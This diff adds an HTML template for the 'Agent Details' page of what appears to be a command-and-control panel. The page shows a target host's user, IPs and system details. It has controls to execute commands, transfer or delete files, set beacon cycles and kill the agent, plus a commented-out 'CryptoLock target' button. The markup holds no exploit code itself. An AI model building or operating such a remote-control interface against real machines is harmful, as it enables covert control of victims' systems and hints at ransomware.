@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="en">
+
+{{ template "page-head" . }}
+
+<body class="hold-transition skin-red sidebar-mini">
+  <div class="wrapper">
+
+    {{ template "page-header" . }}
+
+    {{ template "page-sidebar" . }}
+
+    <!-- Content Wrapper. Contains page content -->
+    <div class="content-wrapper">
+      <!-- Content Header (Page header) -->
+      <section class="content-header">
+        <h1>
+          Agent Details
+          <small>Fishing.</small>
+        </h1>
+      </section>
+
+      <!-- Main content -->
+      <section class="content">
+        <div class="row">
+          <div class="col-md-12">
+            <div class="box box-solid">
+              <div class="box-header with-border">
+                <h3 class="box-title">
+                  {{ with .Details }}
+                  <strong>UUID</strong>
+                  {{.UUID}}
+                </h3>
+                <button class="btn btn-primary" style="float: right;" onclick="location.reload();">
+                  <i class="fa fa-refresh"></i>
+                </button>
+              </div>
+              <!-- /.box-header -->
+
+              <div class="box-body">
+                <div class="row">
+                  <div class="col-md-6">
+                    <input id="agent_uuid" type="hidden" value="{{.UUID}}">
+                    <table class="table table-bordered">
+                      <tbody>
+                        <tr>
+                          <td><strong>Username / Hostname</strong></td>
+                          <td>{{.Username}} @ {{.Hostname}}</td>
+                        </tr>
+                        <tr>
+                          <td><strong>Cycles Min / Max</strong></td>
+                          <td>{{.CycleMin}} / {{.CycleMax}} seconds</td>
+                        </tr>
+                        <tr>
+                          <td><strong>IP Addresses</strong></td>
+                          <td>{{.IPs}}</td>
+                        </tr>
+                        <tr>
+                          <td><strong>External IP</strong></td>
+                          <td>{{.IPsrc}}</td>
+                        </tr>
+                        <tr>
+                          <td><strong>GOOS</strong></td>
+                          <td>
+                            {{ .GOOS }}
+                          </td>
+                        </tr>
+                        <tr>
+                          <td><strong>GOARCH</strong></td>
+                          <td>{{.GOARCH}}</td>
+                        </tr>
+                        <tr>
+                          <td><strong>Uname</strong></td>
+                          <td>{{.Uname}}</td>
+                        </tr>
+                        <tr>
+                          <td><strong>Last Seen</strong></td>
+                          <td>{{ pastTimeAgo .UpdatedAt}}</td>
+                        </tr>
+                        <tr>
+                          <td><strong>Registered</strong></td>
+                          <td>{{ pastTimeAgo .CreatedAt}}</td>
+                        </tr>
+                      </tbody>
+                    </table>
+                  </div>
+                  {{ end }}
+                  <div class="col-md-6">
+                    <div class="mb-0">
+                      <a id="button_command" class="btn btn-app" data-toggle="tooltip" data-placement="top"
+                        title="Execute command in target">
+                        <i class="fa fa-terminal"></i> Execute
+                      </a>
+                      <a id="button_get" class="btn btn-app disabled" data-toggle="tooltip" data-placement="top"
+                        title="Get file from target">
+                        <i class="fa fa-download"></i> Get File
+                      </a>
+                      <a id="button_put" class="btn btn-app disabled" data-toggle="tooltip" data-placement="top"
+                        title="Put file into target">
+                        <i class="fa fa-upload"></i> Put File
+                      </a>
+                      <a id="button_delete" class="btn btn-app disabled" data-toggle="tooltip" data-placement="top"
+                        title="Delete file from target">
+                        <i class="fa fa-trash"></i> Delete File
+                      </a>
+                      <a id="button_cycles" class="btn btn-app" data-toggle="tooltip" data-placement="top"
+                        title="Change cycles in target">
+                        <i class="fa fa-hourglass-half"></i> Set Cycles
+                      </a>
+                      <a id="button_sleep" class="btn btn-app" data-toggle="tooltip" data-placement="top"
+                        title="Make agent to sleep">
+                        <i class="fa fa-pause"></i> Sleep Agent
+                      </a>
+                      <a id="button_exit" class="btn btn-app" data-toggle="tooltip" data-placement="top"
+                        title="Exit agent">
+                        <i class="fa fa-sign-out"></i> Kill Agent
+                      </a>
+                      <!-- <a id="button_lock" class="btn btn-app" data-toggle="tooltip" data-placement="top"
+                        title="CryptoLock target">
+                        <i class="fa fa-lock"></i> Lock Machine
+                      </a> -->
+                      <a id="button_reg" class="btn btn-app disabled" data-toggle="tooltip" data-placement="top"
+                        title="Update data">
+                        <i class="fa fa-history"></i> Update Agent
+                      </a>
+                    </div>
+
+                    <div style="overflow:auto; height:240px;">
+
+                      <table class="table table-striped">
+                        <thead>
+                          <tr>
+                            <td><strong>Completed?</strong></td>
+                            <td><strong>When</strong></td>
+                            <td><strong>Action</strong></td>
+                            <td><strong>Payload</strong></td>
+                          </tr>
+                        </thead>
+                        <tbody>
+                          {{range .Commands}}
+                          <tr>
+                            <td>
+                              {{ if .Completed }}
+                              <span style="color: green;"><i class="fa fa-check"></i></span>
+                              {{ else }}
+                              <span style="color: red;"><i class="fa fa-clock-o"></i></span>
+                              {{end}}
+                            </td>
+                            <td>{{ pastTimeAgo .UpdatedAt}}</td>
+                            <td><code>{{ .Action }}</code></td>
+                            <td>{{ .Payload }}</td>
+                          </tr>
+                          {{ end }}
+                        </tbody>
+                      </table>
+                    </div>
+
+                  </div> <!-- /col-4 -->
+                </div> <!-- /row -->
+              </div> <!-- ./box-contetn-->
+            </div> <!-- /box -->
+
+            <!-- AGENT OUTPUT -->
+            <div class="row">
+              <div class="col-md-12" style="overflow:auto; height:500px;">
+                <div class="box box-solid">
+                  <div class="box-header with-border">
+                    <h3 class="box-title">Agent Logs</h3>
+                  </div>
+                  <!-- /.box-header -->
+                  <div class="box-body">
+                    <pre>
+                <table class="table table-striped" border="1">
+                  <thead>
+                    <tr>
+                      <td><strong>Seen</strong></td>
+                      <td><strong>Action</strong></td>
+                      <td><strong>Status</strong></td>
+                      <td><strong>Payload</strong></td>
+                      <td><strong>Data</strong></td>
+                    </tr>
+                  </thead>
+                  <tbody>
+                {{ range .Logs }}
+                    <tr>
+                      <td>{{ pastTimeAgo .CreatedAt}}</td>
+                      <td>{{ .Action}}</td>
+                      <td>{{ .Status}}</td>
+                      <td>{{ .Payload}}</td>
+                      <td>{{ .Data}}</td>
+                    </tr>
+                {{ end }}
+                  <tbody>
+                </table>
+                </pre>
+                  </div>
+                  <!--/box body-->
+                </div>
+                <!--/box -->
+              </div> <!-- /column -->
+            </div> <!-- /row -->
+
+      </section>
+      <!-- /.content -->
+    </div>
+    <!-- /.content-wrapper -->
+
+    {{ template "page-footer" . }}
+
+    {{ template "page-modals" . }}
+
+    {{ template "page-js" . }}
+
+    <script type="text/javascript" language="javascript">
+      $(document).ready(function () {
+        $("#button_command").on("click", function () {
+          command_modal_code();
+        });
+
+        $("#button_get").on("click", function () {
+          get_modal_code();
+        });
+
+        $("#button_put").on("click", function () {
+          put_modal_code();
+        });
+
+        $("#button_delete").on("click", function () {
+          delete_modal_code();
+        });
+
+        $("#button_sleep").on("click", function () {
+          sleep_modal_code();
+        });
+
+        $("#button_exit").on("click", function () {
+          exit_modal_code();
+        });
+
+        $("#button_lock").on("click", function () {
+          lock_modal_code();
+        });
+
+        $("#button_cycles").on("click", function () {
+          cycles_modal_code();
+        });
+
+        $("#button_reg").on("click", function () {
+          reg_modal_code();
+        });
+      });
+    </script>
+</body>
+
+</html>
